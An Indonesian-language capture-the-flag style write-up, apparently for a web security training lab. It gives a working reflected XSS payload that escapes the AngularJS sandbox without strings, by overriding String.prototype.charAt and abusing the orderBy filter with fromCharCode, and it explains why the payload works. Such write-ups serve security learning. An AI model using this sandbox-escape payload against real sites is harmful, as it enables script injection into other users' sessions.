# Reflected XSS with AngularJS sandbox escape without strings

Lab ini menggunakan **AngularJS** dengan cara yang tidak biasa, di mana fungsi **$eval tidak tersedia**, dan kamu tidak dapat menggunakan string apa pun di AngularJS.

Untuk menyelesaikan lab ini, lakukan serangan **cross-site scripting (XSS)** yang berhasil keluar dari sandbox (sandbox escape) dan mengeksekusi fungsi **alert** tanpa menggunakan fungsi **$eval**.


## Solusi

1. Masukkan string alfanumerik di search,conothnay `TESTINF123`.

2. Perhatikan input kita masuk ke Javascript

```html
<script>
angular.module('labApp', []).controller('vulnCtrl', function ($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'TESTING123';
    $scope.value = $parse(key)($scope.query);
});
</script>
```

3. Coba masukna `">TESTING123`,dan perhatikan outpunay jadi seprti ini:

```html
<script>
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
  $scope.query = {};
  var key = 'search';
  $scope.query[key] = '&quot;&gt;TESTING123';
  $scope.value = $parse(key)($scope.query);
});
</script>

<h1 ng-controller="vulnCtrl" class="ng-scope ng-binding">0 search results for &amp;quot;&amp;gt;TESTING123</h1>
```

dan payload `{{7*7}}` juga tidak bekerja.


4. Kita cob payload `1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

tapi kalau kita masukkan ke search bar,,kita akan mendapktna kesalahn `"Search term cannot exceed 120 characters"`.solusinya akses langung di URL.


5. Kunjungi URL berikut, dengan mengganti **YOUR-LAB-ID** dengan ID lab kamu:

```
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

6. Perhatikan sekarang jadi seprpti ini :

```html
<script>
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
  $scope.query = {};
  var key = 'search';
  $scope.query[key] = '1';
  $scope.value = $parse(key)($scope.query);
  var key = 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)';
  $scope.query[key] = '1';
  $scope.value = $parse(key)($scope.query);
});
</script>

<h1 ng-controller="vulnCtrl" class="ng-scope ng-binding">2 search results for {{value}}</h1>
```

Eksploit ini menggunakan `toString()` untuk membuat string tanpa menggunakan tanda kutip. Kemudian, exploit ini mengambil prototype dari String dan menimpa fungsi `charAt` untuk semua string. Hal ini secara efektif merusak sandbox AngularJS.

Selanjutnya, sebuah array diberikan ke filter `orderBy`. Kemudian argumen untuk filter tersebut diatur lagi menggunakan `toString()` untuk membuat string dan properti String constructor.

Akhirnya, metode `fromCharCode` digunakan untuk membangun payload dengan mengubah kode karakter menjadi string `x=alert(1)`.

Karena fungsi `charAt` sudah ditimpa, AngularJS akan mengizinkan kode ini berjalan, padahal normalnya tidak diperbolehkan.
